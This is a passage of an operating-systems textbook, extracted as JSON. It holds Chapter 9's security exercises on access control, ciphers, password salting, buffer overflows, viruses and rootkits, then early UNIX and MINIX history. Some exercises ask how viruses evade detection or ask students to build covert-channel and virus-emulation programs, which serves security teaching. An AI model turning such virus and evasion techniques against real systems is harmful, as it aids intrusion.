covert channel? What is the basic requirement for a covert channel to exist?\r\n4. In a full access-control matrix, the rows are for domains and the columns are for ob\u0002jects. What happens if some object is needed in two domains?\r\n5. Suppose that a system has 5000 objects and 100 domains at some time. 1% of the ob\u0002jects are accessible (some combination of r, w and x) in all domains, 10% are ac\u0002cessible in two domains, and the remaining 89% are accessible in only one domain.\r\nSuppose one unit of space is required to store an access right (some combination of r,\r\nw, x), object ID, or a domain ID. How much space is needed to store the full protec\u0002tion matrix, protection matrix as ACL, and protection matrix as capability list?\r\n6. Explain which implementation of the protection matrix is more suitable for the follow\u0002ing operations:\r\n(a) Granting read access to a file for all users.\r\n(b) Revoking write access to a file from all users.\r\n(c) Granting write access to a file to John, Lisa, Christie, and Jeff.\r\n(d) Revoking execute access to a file from Jana, Mike, Molly, and Shane.\r\n7. Tw o different protection mechanisms that we have discussed are capabilities and ac\u0002cess-control lists. For each of the following protection problems, tell which of these\r\nmechanisms can be used.\r\n(a) Ken wants his files readable by everyone except his office mate.\r\n(b) Mitch and Steve want to share some secret files.\r\n(c) Linda wants some of her files to be public.\r\n8. Represent the ownerships and permissions shown in this UNIX directory listing as a\r\nprotection matrix. (Note: asw is a member of two groups: users and devel; gmw is a\r\nmember only of users.) Treat each of the two users and two groups as a domain, so\r\nthat the matrix has four rows (one per domain) and four columns (one per file).\r\n– rw– r– – r– – 2 gmw users 908 May 26 16:45 PPP– Notes\r\n– rwx r– x r– x 1 asw dev el 432 May 13 12:35 prog1\r\n– rw– rw– – – – 1 asw users 50094 May 30 17:51 project.t\r\n– rw– r– – – – – 1 asw dev el 13124 May 31 14:30 splash.gif\r\n9. Express the permissions shown in the directory listing of the previous problem as ac\u0002cess-control lists.\nCHAP. 9 PROBLEMS 707\r\n10. Modify the ACL from the previous problem for one file to grant or deny an access that\r\ncannot be expressed using the UNIX rwx system. Explain this modification.\r\n11. Suppose there are four security levels, 1, 2 and 3. Objects A and B are at level 1, C\r\nand D are at level 2, and E and F are at level 3. Processes 1 and 2 are at level 1, 3 and\r\n4 are at level 2, and 5 and 6 are at level 3. For each of the following operations, spec\u0002ify whether they are permissible under Bell-LaPadula model, Biba model, or both.\r\n(a) Process 1 writes object D\r\n(b) Process 4 reads object A\r\n(c) Process 3 reads object C\r\n(d) Process 3 writes object C\r\n(e) Process 2 reads object D\r\n(f) Process 5 writes object F\r\n(g) Process 6 reads object E\r\n(h) Process 4 write object E\r\n(i) Process 3 reads object F\r\n12. In the Amoeba scheme for protecting capabilities, a user can ask the server to produce\r\na new capability with fewer rights, which can then be given to a friend. What happens\r\nif the friend asks the server to remove even more rights so that the friend can give it to\r\nsomeone else?\r\n13. In Fig. 9-11, there is no arrow from process B to object 1. Would such an arrow be al\u0002lowed? If not, what rule would it violate?\r\n14. If process-to-process messages were allowed in Fig. 9-11, what rules would apply to\r\nthem? For process B in particular, to which processes could it send messages and\r\nwhich not?\r\n15. Consider the steganographic system of Fig. 9-14. Each pixel can be represented in a\r\ncolor space by a point in the three-dimensional system with axes for the R, G, and B\r\nvalues. Using this space, explain what happens to the color resolution when steganog\u0002raphy is employed as it is in this figure.\r\n16. Break the following monoalphabetic cipher. The plaintext, consisting of letters only, is\r\na well-known excerpt from a poem by Lewis Carroll.\r\nkfd ktbd fzm eubd kfd pzyiom mztx ku kzyg ur bzha kfthcm\r\nur mfudm zhx mftnm zhx mdzythc pzq ur ezsszcdm zhx gthcm\r\nzhx pfa kfd mdz tm sutythc fuk zhx pfdkfdi ntcm fzld pthcm\r\nsok pztk z stk kfd uamkdim eitdx sdruid pd fzld uoi efzk\r\nrui mubd ur om zid uok ur sidzkf zhx zyy ur om zid rzk\r\nhu foiia mztx kfd ezindhkdi kfda kfzhgdx ftb boef rui kfzk\r\n17. Consider a secret-key cipher that has a 26 × 26 matrix with the columns headed by\r\nABC ... Z and the rows also named ABC ... Z. Plaintext is encrypted two characters at a\r\ntime. The first character is the column; the second is the row. The cell formed by the\r\nintersection of the row and column contains two ciphertext characters. What constraint\r\nmust the matrix adhere to and how many keys are there?\r\n18. Consider the following way to encrypt a file. The encryption algorithm uses two n-byte\r\narrays, A and B. The first n bytes are read from the file into A. Then A[0] is copied to\n708 SECURITY CHAP. 9\r\nB[i], A[1] is copied to B[ j], A[2] is copied to B[k], etc. After all n bytes are copied to\r\nthe B array, that array is written to the output file and n more bytes are read into A.\r\nThis procedure continues until the entire file has been encrypted. Note that here en\u0002cryption is not being done by replacing characters with other ones, but by changing\r\ntheir order. How many keys hav e to be tried to exhaustively search the key space?\r\nGive an advantage of this scheme over a monoalphabetic substitution cipher.\r\n19. Secret-key cryptography is more efficient than public-key cryptography, but requires\r\nthe sender and receiver to agree on a key in advance. Suppose that the sender and re\u0002ceiver hav e never met, but there exists a trusted third party that shares a secret key with\r\nthe sender and also shares a (different) secret key with the receiver. How can the sender\r\nand receiver establish a new shared secret key under these circumstances?\r\n20. Give a simple example of a mathematical function that to a first approximation will do\r\nas a one-way function.\r\n21. Suppose that two strangers A and B want to communicate with each other using secret\u0002key cryptography, but do not share a key. Suppose both of them trust a third party C\r\nwhose public key is well known. How can the two strangers establish a new shared\r\nsecret key under these circumstances?\r\n22. As Internet cafes become more widespread, people are going to want ways of going to\r\none anywhere in the world and conducting business there. Describe a way to produce\r\nsigned documents from one using a smart card (assume that all the computers are\r\nequipped with smart-card readers). Is your scheme secure?\r\n23. Natural-language text in ASCII can be compressed by at least 50% using various com\u0002pression algorithms. Using this knowledge, what is the steganographic carrying capaci\u0002ty for ASCII text (in bytes) of a 1600 × 1200 image stored using the low-order bits of\r\neach pixel? How much is the image size increased by the use of this technique (assum\u0002ing no encryption or no expansion due to encryption)? What is the efficiency of the\r\nscheme, that is, its payload/(bytes transmitted)?\r\n24. Suppose that a tightly knit group of political dissidents living in a repressive country\r\nare using steganography to send out messages to the world about conditions in their\r\ncountry. The government is aware of this and is fighting them by sending out bogus\r\nimages containing false steganographic messages. How can the dissidents try to help\r\npeople tell the real messages from the false ones?\r\n25. Go to www.cs.vu.nl/ ast and click on covered writing link. Follow the instructions to\r\nextract the plays. Answer the following questions:\r\n(a) What are the sizes of the original-zebras and zebras files?\r\n(b) What plays are secretly stored in the zebras file?\r\n(c) How many bytes are secretly stored in the zebras file?\r\n26. Not having the computer echo the password is safer than having it echo an asterisk for\r\neach character typed, since the latter discloses the password length to anyone nearby\r\nwho can see the screen. Assuming that passwords consist of upper and lowercase let\u0002ters and digits only, and that passwords must be a minimum of fiv e characters and a\r\nmaximum of eight characters, how much safer is not displaying anything?\nCHAP. 9 PROBLEMS 709\r\n27. After getting your degree, you apply for a job as director of a large university computer\r\ncenter that has just put its ancient mainframe system out to pasture and switched over\r\nto a large LAN server running UNIX. You get the job. Fifteen minutes after you start\r\nwork, your assistant bursts into your office screaming: ‘‘Some students have discover\u0002ed the algorithm we use for encrypting passwords and posted it on the Internet.’’ What\r\nshould you do?\r\n28. The Morris-Thompson protection scheme with n-bit random numbers (salt) was de\u0002signed to make it difficult for an intruder to discover a large number of passwords by\r\nencrypting common strings in advance. Does the scheme also offer protection against a\r\nstudent user who is trying to guess the superuser password on his machine? Assume\r\nthe password file is available for reading.\r\n29. Suppose the password file of a system is available to a cracker. How much extra time\r\ndoes the cracker need to crack all passwords if the system is using the Morris-Thomp\u0002son protection scheme with n-bit salt versus if the system is not using this scheme?\r\n30. Name three characteristics that a good biometric indicator must have in order to be\r\nuseful as a login authenticator.\r\n31. Authentication mechanisms are divided into three categories: Something the user\r\nknows, something the user has, and something the user is. Imagine an authentication\r\nsystem that uses a combination of these three categories. For example, it first asks the\r\nuser to enter a login and password, then insert a plastic card (with magnetic strip) and\r\nenter a PIN, and finally provide fingerprints. Can you think of two drawbacks of this\r\ndesign?\r\n32. A computer science department has a large collection of UNIX machines on its local\r\nnetwork. Users on any machine can issue a command of the form\r\nrexec machine4 who\r\nand have the command executed on machine4, without having the user log in on the re\u0002mote machine. This feature is implemented by having the user’s kernel send the com\u0002mand and his UID to the remote machine. Is this scheme secure if the kernels are all\r\ntrustworthy? What if some of the machines are students’ personal computers, with no\r\nprotection?\r\n33. Lamport’s one-time password scheme uses the passwords in reverse order. Would it not\r\nbe simpler to use f (s) the first time, f (f(s)) the second time, and so on?\r\n34. Is there any feasible way to use the MMU hardware to prevent the kind of overflow at\u0002tack shown in Fig. 9-21? Explain why or why not.\r\n35. Describe how stack canaries work and how they can be circumvented by the attackers.\r\n36. The TOCTOU attack exploits race condition between the attacker and the victim. One\r\nway to prevent race conditions is make file system accesses transactions. Explain how\r\nthis approach might work and what problems might arise?\r\n37. Name a C compiler feature that could eliminate a large number of security holes. Why\r\nis it not more widely implemented?\n710 SECURITY CHAP. 9\r\n38. Can the Trojan-horse attack work in a system protected by capabilities?\r\n39. When a file is removed, its blocks are generally put back on the free list, but they are\r\nnot erased. Do you think it would be a good idea to have the operating system erase\r\neach block before releasing it? Consider both security and performance factors in your\r\nanswer, and explain the effect of each.\r\n40. How can a parasitic virus (a) ensure that it will be executed before its host program,\r\nand (b) pass control back to its host after doing whatever it does?\r\n41. Some operating systems require that disk partitions must start at the beginning of a\r\ntrack. How does this make life easier for a boot-sector virus?\r\n42. Change the program of Fig. 9-28 so that it finds all the C programs instead of all the\r\nexecutable files.\r\n43. The virus in Fig. 9-33(d) is encrypted. How can the dedicated scientists at the antivirus\r\nlab tell which part of the file is the key so that they can decrypt the virus and reverse\r\nengineer it? What can Virgil do to make their job a lot harder?\r\n44. The virus of Fig. 9-33(c) has both a compressor and a decompressor. The decompres\u0002sor is needed to expand and run the compressed executable program. What is the com\u0002pressor for?\r\n45. Name one disadvantage of a polymorphic encrypting virus from the point of view of the\r\nvirus writer.\r\n46. Often one sees the following instructions for recovering from a virus attack:\r\n1. Boot the infected system.\r\n2. Back up all files to an external medium.\r\n3. Run fdisk (or a similar program) to format the disk.\r\n4. Reinstall the operating system from the original CD-ROM.\r\n5. Reload the files from the external medium.\r\nName two serious errors in these instructions.\r\n47. Are companion viruses (viruses that do not modify any existing files) possible in\r\nUNIX? If so, how? If not, why not?\r\n48. Self-extracting archives, which contain one or more compressed files packaged with an\r\nextraction program, are frequently used to deliver programs or program updates. Dis\u0002cuss the security implications of this technique.\r\n49. Why are rookits extremely difficult or almost impossible to detect as opposed to\r\nviruses and worms?\r\n50. Could a machine infected with a rootkit be restored to good health by simply rolling\r\nback the software state to a previously stored system restore point?\r\n51. Discuss the possibility of writing a program that takes another program as input and\r\ndetermines if that program contains a virus.\nCHAP. 9 PROBLEMS 711\r\n52. Section 9.10.1 describes a set of firewall rules that limit outside access to only three\r\nservices. Describe another set of rules that you can add to this firewall to further\r\nrestrict access to these services.\r\n53. On some machines, the SHR instruction used in Fig. 9-38(b) fills the unused bits with\r\nzeros; on others the sign bit is extended to the right. For the correctness of Fig. 9-38(b),\r\ndoes it matter which kind of shift instruction is used? If so, which is better?\r\n54. To verify that an applet has been signed by a trusted vendor, the applet vendor may in\u0002clude a certificate signed by a trusted third party that contains its public key. Howev er,\r\nto read the certificate, the user needs the trusted third party’s public key. This could be\r\nprovided by a trusted fourth party, but then the user needs that public key. It appears\r\nthat there is no way to bootstrap the verification system, yet existing browsers use it.\r\nHow could it work?\r\n55. Describe three features that make Java a better programming language than C to write\r\nsecure programs.\r\n56. Assume that your system is using JDK 1.2. Show the rules (similar to those in Figure\r\n9-40) you will use to allow an applet from www.appletsRus.com to run on your ma\u0002chine. This applet may download additional files from www.appletsRus.com, read/write\r\nfiles in /usr/tmp/, and also read files from /usr/me/appletdir.\r\n57. How are applets different from applications? How does this difference relate to secu\u0002rity?\r\n58. Write a pair of programs, in C or as shell scripts, to send and receive a message by a\r\ncovert channel on a UNIX system. (Hint: A permission bit can be seen even when a\r\nfile is otherwise inaccessible, and the sleep command or system call is guaranteed to\r\ndelay for a fixed time, set by its argument.) Measure the data rate on an idle system.\r\nThen create an artificially heavy load by starting up numerous different background\r\nprocesses and measure the data rate again.\r\n59. Several UNIX systems use the DES algorithm for encrypting passwords. These sys\u0002tems typically apply DES 25 times in a row to obtain the encrypted password. Down\u0002load an implementation of DES from the Internet and write a program that encrypts a\r\npassword and checks if a password is valid for such a system. Generate a list of 10 en\u0002crypted passwords using the Morris-Thomson protection scheme. Use 16-bit salt for\r\nyour program.\r\n60. Suppose a system uses ACLs to maintain its protection matrix. Write a set of man\u0002agement functions to manage the ACLs when (1) a new object is created; (2) an object\r\nis deleted; (3) a new domain is created; (4) a domain is deleted; (5) new access rights\r\n(a combination of r, w, x) are granted to a domain to access an object; (6) existing ac\u0002cess rights of a domain to access an object are revoked; (7) new access rights are grant\u0002ed to all domains to access an object; (8) access rights to access an object are revoked\r\nfrom all domains.\r\n61. Implement the program code outlined in Sec. 9.7.1 to see what happens when there is\r\nbuffer overflow. Experiment with different string sizes.\n712 SECURITY CHAP. 9\r\n62. Write a program that emulates overwriting viruses outlined in Sec. 9.9.2 under the\r\nheading ‘‘Executable Program Viruses’’. Choose an existing executable file that you\r\nknow can be overwritten without any harm. For the virus binary, choose any harmless\r\nexecutable binary.\n10\r\nCASE STUDY 1: UNIX,\r\nLINUX, AND ANDROID\r\nIn the previous chapters, we took a close look at many operating system prin\u0002ciples, abstractions, algorithms, and techniques in general. Now it is time to look at\r\nsome concrete systems to see how these principles are applied in the real world.\r\nWe will begin with Linux, a popular variant of UNIX, which runs on a wide variety\r\nof computers. It is one of the dominant operating systems on high-end worksta\u0002tions and servers, but it is also used on systems ranging from smartphones\r\n(Android is based on Linux) to supercomputers.\r\nOur discussion will start with its history and evolution of UNIX and Linux.\r\nThen we will provide an overview of Linux, to give an idea of how it is used. This\r\noverview will be of special value to readers familiar only with Windows, since the\r\nlatter hides virtually all the details of the system from its users. Although graphical\r\ninterfaces may be easy for beginners, they provide little flexibility and no insight\r\ninto how the system works.\r\nNext we come to the heart of this chapter, an examination of processes, memo\u0002ry management, I/O, the file system, and security in Linux. For each topic we will\r\nfirst discuss the fundamental concepts, then the system calls, and finally the imple\u0002mentation.\r\nRight off the bat we should address the question: Why Linux? Linux is a vari\u0002ant of UNIX, but there are many other versions and variants of UNIX including\r\nAIX, FreeBSD, HP-UX, SCO UNIX, System V, Solaris, and others. Fortunately,\r\nthe fundamental principles and system calls are pretty much the same for all of\r\nthem (by design). Furthermore, the general implementation strategies, algorithms,\r\n713"
      }
    }
  },
  "10 CASE STUDY 1: UNIX, LINUX, AND ANDROID": {
    "page": 744,
    "children": {
      "10.1 HISTORY OF UNIX AND LINUX": {
        "page": 745,
        "children": {
          "10.1.1 UNICS": {
            "page": 745,
            "content": "10.1.1 UNICS\r\nWay back in the 1940s and 1950s, all computers were personal computers in\r\nthe sense that the then-normal way to use a computer was to sign up for an hour of\r\ntime and take over the entire machine for that period. Of course, these machines\r\nwere physically immense, but only one person (the programmer) could use them at\r\nany giv en time. When batch systems took over, in the 1960s, the programmer sub\u0002mitted a job on punched cards by bringing it to the machine room. When enough\r\njobs had been assembled, the operator read them all in as a single batch. It usually\r\ntook an hour or more after submitting a job until the output was returned. Under\r\nthese circumstances, debugging was a time-consuming process, because a single\r\nmisplaced comma might result in wasting several hours of the programmer’s time.\r\nTo get around what everyone viewed as an unsatisfactory, unproductive, and\r\nfrustrating arrangement, timesharing was invented at Dartmouth College and\r\nM.I.T. The Dartmouth system ran only BASIC and enjoyed a short-term commer\u0002cial success before vanishing. The M.I.T. system, CTSS, was general purpose and\r\nwas a big success in the scientific community. Within a short time, researchers at\r\nM.I.T. joined forces with Bell Labs and General Electric (then a computer vendor)\r\nand began designing a second-generation system, MULTICS (MULTiplexed\r\nInformation and Computing Service), as we discussed in Chap. 1.\r\nAlthough Bell Labs was one of the founding partners in the MULTICS project,\r\nit later pulled out, which left one of the Bell Labs researchers, Ken Thompson,\r\nlooking around for something interesting to do. He eventually decided to write a\r\nstripped-down MULTICS all by himself (in assembly language this time) on an old\nSEC. 10.1 HISTORY OF UNIX AND LINUX 715\r\ndiscarded PDP-7 minicomputer. Despite the tiny size of the PDP-7, Thompson’s\r\nsystem actually worked and could support Thompson’s dev elopment effort. Conse\u0002quently, one of the other researchers at Bell Labs, Brian Kernighan, somewhat jok\u0002ingly called it UNICS (UNiplexed Information and Computing Service).\r\nDespite puns about ‘‘EUNUCHS’’ being a castrated MULTICS, the name stuck, al\u0002though the spelling was later changed to UNIX."
          },
          "10.1.2 PDP-11 UNIX": {
            "page": 746,
            "content": "10.1.2 PDP-11 UNIX\r\nThompson’s work so impressed his colleagues at Bell Labs that he was soon\r\njoined by Dennis Ritchie, and later by his entire department. Two major develop\u0002ments occurred around this time. First, UNIX was moved from the obsolete PDP-7\r\nto the much more modern PDP-11/20 and then later to the PDP-11/45 and\r\nPDP-11/70. The latter two machines dominated the minicomputer world for much\r\nof the 1970s. The PDP-11/45 and PDP-11/70 were powerful machines with large\r\nphysical memories for their era (256 KB and 2 MB, respectively). Also, they had\r\nmemory-protection hardware, making it possible to support multiple users at the\r\nsame time. However, they were both 16-bit machines that limited individual proc\u0002esses to 64 KB of instruction space and 64 KB of data space, even though the ma\u0002chine may have had far more physical memory.\r\nThe second development concerned the language in which UNIX was written.\r\nBy now it was becoming painfully obvious that having to rewrite the entire system\r\nfor each new machine was no fun at all, so Thompson decided to rewrite UNIX in\r\na high-level language of his own design, called B. B was a simplified form of\r\nBCPL (which itself was a simplified form of CPL, which, like PL/I, never worked).\r\nDue to weaknesses in B, primarily lack of structures, this attempt was not suc\u0002cessful. Ritchie then designed a successor to B, (naturally) called C, and wrote an\r\nexcellent compiler for it. Working together, Thompson and Ritchie rewrote UNIX\r\nin C. C was the right language at the right time and has dominated system pro\u0002gramming ever since.\r\nIn 1974, Ritchie and Thompson published a landmark paper about UNIX\r\n(Ritchie and Thompson, 1974). For the work described in this paper they were la\u0002ter given the prestigious ACM Turing Award (Ritchie, 1984; Thompson, 1984).\r\nThe publication of this paper stimulated many universities to ask Bell Labs for a\r\ncopy of UNIX. Since Bell Labs’ parent company, AT&T, was a regulated\r\nmonopoly at the time and was not permitted to be in the computer business, it had\r\nno objection to licensing UNIX to universities for a modest fee.\r\nIn one of those coincidences that often shape history, the PDP-11 was the com\u0002puter of choice at nearly all university computer science departments, and the oper\u0002ating systems that came with the PDP-11 were widely regarded as dreadful by pro\u0002fessors and students alike. UNIX quickly filled the void, not least because it was\r\nsupplied with the complete source code, so that people could, and did, tinker with\r\nit endlessly. Scientific meetings were organized around UNIX, with distinguished\n716 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nspeakers getting up in front of the room to tell about some obscure kernel bug they\r\nhad found and fixed. An Australian professor, John Lions, wrote a commentary on\r\nthe UNIX source code of the type normally reserved for the works of Chaucer or\r\nShakespeare (reprinted as Lions, 1996). The book described Version 6, so named\r\nbecause it was described in the sixth edition of the UNIX Programmer’s Manual.\r\nThe source code was 8200 lines of C and 900 lines of assembly code. As a result\r\nof all this activity, new ideas and improvements to the system spread rapidly.\r\nWithin a few years, Version 6 was replaced by Version 7, the first portable ver\u0002sion of UNIX (it ran on the PDP-11 and the Interdata 8/32), by now 18,800 lines of\r\nC and 2100 lines of assembler. A whole generation of students was brought up on\r\nVersion 7, which contributed to its spread after they graduated and went to work in\r\nindustry. By the mid-1980s, UNIX was in widespread use on minicomputers and\r\nengineering workstations from a variety of vendors. A number of companies even\r\nlicensed the source code to make their own version of UNIX. One of these was a\r\nsmall startup called Microsoft, which sold Version 7 under the name XENIX for a\r\nnumber of years until its interest turned elsewhere."
          },
          "10.1.3 Portable UNIX": {
            "page": 747,
            "content": "10.1.3 Portable UNIX\r\nNow that UNIX was in C, moving it to a new machine, known as porting it,\r\nwas much easier than in the early days when it was written in assembly language.\r\nA port requires first writing a C compiler for the new machine. Then it requires\r\nwriting device drivers for the new machine’s I/O devices, such as monitors, print\u0002ers, and disks. Although the driver code is in C, it cannot be moved to another ma\u0002chine, compiled, and run there because no two disks work the same way. Finally, a\r\nsmall amount of machine-dependent code, such as the interrupt handlers and mem\u0002ory-management routines, must be rewritten, usually in assembly language.\r\nThe first port beyond the PDP-11 was to the Interdata 8/32 minicomputer. This\r\nexercise revealed a large number of assumptions that UNIX implicitly made about\r\nthe machine it was running on, such as the unspoken supposition that integers held\r\n16 bits, pointers also held 16 bits (implying a maximum program size of 64 KB),\r\nand that the machine had exactly three registers available for holding important\r\nvariables. None of these were true on the Interdata, so considerable work was\r\nneeded to clean UNIX up.\r\nAnother problem was that although Ritchie’s compiler was fast and produced\r\ngood object code, it produced only PDP-11 object code. Rather than write a new\r\ncompiler specifically for the Interdata, Steve Johnson of Bell Labs designed and\r\nimplemented the portable C compiler, which could be retargeted to produce code\r\nfor any reasonable machine with only a moderate amount of effort. For years,\r\nnearly all C compilers for machines other than the PDP-11 were based on John\u0002son’s compiler, which greatly aided the spread of UNIX to new computers.\r\nThe port to the Interdata initially went slowly at first because the development\r\nwork had to be done on the only working UNIX machine, a PDP-11, which was\nSEC. 10.1 HISTORY OF UNIX AND LINUX 717\r\nlocated on the fifth floor at Bell Labs. The Interdata was on the first floor. Gener\u0002ating a new version meant compiling it on the fifth floor and then physically carry\u0002ing a magnetic tape down to the first floor to see if it worked. After several months\r\nof tape carrying, an unknown person said: ‘‘You know, we’re the phone company.\r\nCan’t we run a wire between these two machines?’’ Thus, was UNIX networking\r\nborn. After the Interdata port, UNIX was ported to the VAX and later to other com\u0002puters.\r\nAfter AT&T was broken up in 1984 by the U.S. government, the company was\r\nlegally free to set up a computer subsidiary, and did so. Shortly thereafter, AT&T\r\nreleased its first commercial UNIX product, System III. It was not well received,\r\nso it was replaced by an improved version, System V, a year later. Whatever hap\u0002pened to System IV is one of the great unsolved mysteries of computer science.\r\nThe original System V has since been replaced by System V, releases 2, 3, and 4,\r\neach one bigger and more complicated than its predecessor. In the process, the\r\noriginal idea behind UNIX, of having a simple, elegant system, has gradually\r\ndiminished. Although Ritchie and Thompson’s group later produced an 8th, 9th,\r\nand 10th edition of UNIX, these were never widely circulated, as AT&T put all its\r\nmarketing muscle behind System V. Howev er, some of the ideas from the 8th, 9th,\r\nand 10th editions were eventually incorporated into System V. AT&T eventually\r\ndecided that it wanted to be a telephone company after all, not a computer com\u0002pany, and sold its UNIX business to Novell in 1993. Novell subsequently sold it to\r\nthe Santa Cruz Operation in 1995. By then it was almost irrelevant who owned it,\r\nsince all the major computer companies already had licenses."
          },
          "10.1.4 Berkeley UNIX": {
            "page": 748,
            "content": "10.1.4 Berkeley UNIX\r\nOne of the many universities that acquired UNIX Version 6 early on was the\r\nUniversity of California at Berkeley. Because the full source code was available,\r\nBerkeley was able to modify the system substantially. Aided by grants from ARPA,\r\nthe U.S. Dept. of Defense’s Advanced Research Projects Agency, Berkeley pro\u0002duced and released an improved version for the PDP-11 called 1BSD (First\r\nBerkeley Software Distribution). This tape was followed quickly by another, cal\u0002led 2BSD, also for the PDP-11.\r\nMore important were 3BSD and especially its successor, 4BSD for the VAX.\r\nAlthough AT&T had a VAX version of UNIX, called 32V, it was essentially Ver\u0002sion 7. In contrast, 4BSD contained a large number of improvements. Foremost\r\namong these was the use of virtual memory and paging, allowing programs to be\r\nlarger than physical memory by paging parts of them in and out as needed. Anoth\u0002er change allowed file names to be longer than 14 characters. The implementation\r\nof the file system was also changed, making it considerably faster. Signal handling\r\nwas made more reliable. Networking was introduced, causing the network proto\u0002col that was used, TCP/IP, to become a de facto standard in the UNIX world, and\r\nlater in the Internet, which is dominated by UNIX-based servers.\n718 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nBerkeley also added a substantial number of utility programs to UNIX, includ\u0002ing a new editor (vi), a new shell (csh), Pascal and Lisp compilers, and many more.\r\nAll these improvements caused Sun Microsystems, DEC, and other computer ven\u0002dors to base their versions of UNIX on Berkeley UNIX, rather than on AT&T’s\r\n‘‘official’’ version, System V. As a consequence, Berkeley UNIX became well es\u0002tablished in the academic, research, and defense worlds. For more information\r\nabout Berkeley UNIX, see McKusick et al. (1996)."
          },
          "10.1.5 Standard UNIX": {
            "page": 749,
            "content": "10.1.5 Standard UNIX\r\nBy the end of the 1980s, two different, and somewhat incompatible, versions\r\nof UNIX were in widespread use: 4.3BSD and System V Release 3. In addition,\r\nvirtually every vendor added its own nonstandard enhancements. This split in the\r\nUNIX world, together with the fact that there were no standards for binary pro\u0002gram formats, greatly inhibited the commercial success of UNIX because it was\r\nimpossible for software vendors to write and package UNIX programs with the\r\nexpectation that they would run on any UNIX system (as was routinely done with\r\nMS-DOS). Various attempts at standardizing UNIX initially failed. AT&T, for ex\u0002ample, issued the SVID (System V Interface Definition), which defined all the\r\nsystem calls, file formats, and so on. This document was an attempt to keep all the\r\nSystem V vendors in line, but it had no effect on the enemy (BSD) camp, which\r\njust ignored it.\r\nThe first serious attempt to reconcile the two flavors of UNIX was initiated\r\nunder the auspices of the IEEE Standards Board, a highly respected and, most im\u0002portantly, neutral body. Hundreds of people from industry, academia, and govern\u0002ment took part in this work. The collective name for this project was POSIX. The\r\nfirst three letters refer to Portable Operating System. The IX was added to make the\r\nname UNIXish.\r\nAfter a great deal of argument and counterargument, rebuttal and counterrebut\u0002tal, the POSIX committee produced a standard known as 1003.1. It defines a set of\r\nlibrary procedures that every conformant UNIX system must supply. Most of these\r\nprocedures invoke a system call, but a few can be implemented outside the kernel.\r\nTypical procedures are open, read, and fork. The idea of POSIX is that a software\r\nvendor who writes a program that uses only the procedures defined by 1003.1\r\nknows that this program will run on every conformant UNIX system.\r\nWhile it is true that most standards bodies tend to produce a horrible compro\u0002mise with a few of everyone’s pet features in it, 1003.1 is remarkably good consid\u0002ering the large number of parties involved and their respective vested interests.\r\nRather than take the union of all features in System V and BSD as the starting\r\npoint (the norm for most standards bodies), the IEEE committee took the intersec\u0002tion. Very roughly, if a feature was present in both System V and BSD, it was in\u0002cluded in the standard; otherwise it was not. As a consequence of this algorithm,\r\n1003.1 bears a strong resemblance to the common ancestor of both System V and\nSEC. 10.1 HISTORY OF UNIX AND LINUX 719\r\nBSD, namely Version 7. The 1003.1 document is written in such a way that both\r\noperating system implementers and software writers can understand it, another\r\nnovelty in the standards world, although work is already underway to remedy this.\r\nAlthough the 1003.1 standard addresses only the system calls, related docu\u0002ments standardize threads, the utility programs, networking, and many other fea\u0002tures of UNIX. In addition, the C language has also been standardized by ANSI\r\nand ISO."
          },
          "10.1.6 MINIX": {
            "page": 750,
            "content": "10.1.6 MINIX\r\nOne property that all modern UNIX systems have is that they are large and\r\ncomplicated, in a sense the antithesis of the original idea behind UNIX. Even if\r\nthe source code were freely available, which it is not in most cases, it is out of the\r\nquestion that a single person could understand it all any more. This situation led\r\none of the authors of this book (AST) to write a new UNIX-like system that was\r\nsmall enough to understand, was available with all the source code, and could be\r\nused for educational purposes. That system consisted of 11,800 lines of C and 800\r\nlines of assembly code. Released in 1987, it was functionally almost equivalent to\r\nVersion 7 UNIX, the mainstay of most computer science departments during the\r\nPDP-11 era.\r\nMINIX was one of the first UNIX-like systems based on a microkernel design.\r\nThe idea behind a microkernel is to provide minimal functionality in the kernel to\r\nmake it reliable and efficient. Consequently, memory management and the file sys\u0002tem were pushed out into user processes. The kernel handled message passing be\u0002tween the processes and little else. The kernel was 1600 lines of C and 800 lines\r\nof assembler. For technical reasons relating to the 8088 architecture, the I/O device\r\ndrivers (2900 additional lines of C) were also in the kernel. The file system (5100\r\nlines of C) and memory manager (2200 lines of C) ran as two separate user proc\u0002esses.\r\nMicrokernels have the advantage over monolithic systems that they are easy to\r\nunderstand and maintain due to their highly modular structure. Also, moving code\r\nfrom the kernel to user mode makes them highly reliable because the crash of a\r\nuser-mode process does less damage than the crash of a kernel-mode component.\r\nTheir main disadvantage is a slightly lower performance due to the extra switches\r\nbetween user mode and kernel mode. However, performance is not everything: all\r\nmodern UNIX systems run X Windows in user mode and simply accept the per\u0002formance hit to get the greater modularity (in contrast to Windows, where even the\r\nGUI (Graphical User Interface) is in the kernel). Other well-known microkernel\r\ndesigns of this era were Mach (Accetta et al., 1986) and Chorus (Rozier et al.,\r\n1988).\r\nWithin a few months of its appearance, MINIX became a bit of a cult item,\r\nwith its own USENET (now Google) newsgroup, comp.os.minix, and over 40,000\r\nusers. Numerous users contributed commands and other user programs, so MINIX\n720 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nquickly became a collective undertaking by large numbers of users over the Inter\u0002net. It was a prototype of other collaborative efforts that came later. In 1997, Ver\u0002sion 2.0 of MINIX, was released and the base system, now including networking,\r\nhad grown to 62,200 lines of code.\r\nAround 2004, the direction of MINIX development changed aharply. The fo\u0002cus shifted to building an extremely reliable and dependable system that could\r\nautomatically repair its own faults and become self healing, continuing to function\r\ncorrectly even in the face of repeated software bugs being triggered. As a conse\u0002quence, the modularization idea present in Version 1 was greatly expanded in\r\nMINIX 3.0. Nearly all the device drivers were moved to user space, with each driv\u0002er running as a separate process. The size of the entire kernel abruptly dropped to\r\nunder 4000 lines of code, something a single programmer could easily understand.\r\nInternal mechanisms were changed to enhance fault tolerance in numerous ways.\r\nIn addition, over 650 popular UNIX programs were ported to MINIX 3.0, in\u0002cluding the X Window System (sometimes just called X), various compilers (in\u0002cluding gcc), text-processing software, networking software, Web browsers, and\r\nmuch more. Unlike previous versions, which were primarily educational in nature,\r\nstarting with MINIX 3.0, the system was quite usable, with the focus moving to\u0002ward high dependability. The ultimate goal is: No more reset buttons.\r\nA third edition of the book Operating Systems: Design and Implementation\r\nappeared, describing the new system, giving its source code in an appendix, and\r\ndescribing it in detail (Tanenbaum and Woodhull, 2006). The system continues to\r\nev olve and has an active user community. It has since been ported to the ARM\r\nprocessor, making it available for embedded systems. For more details and to get\r\nthe current version for free, you can visit www.minix3.org."
          },
          "10.1.7 Linux": {
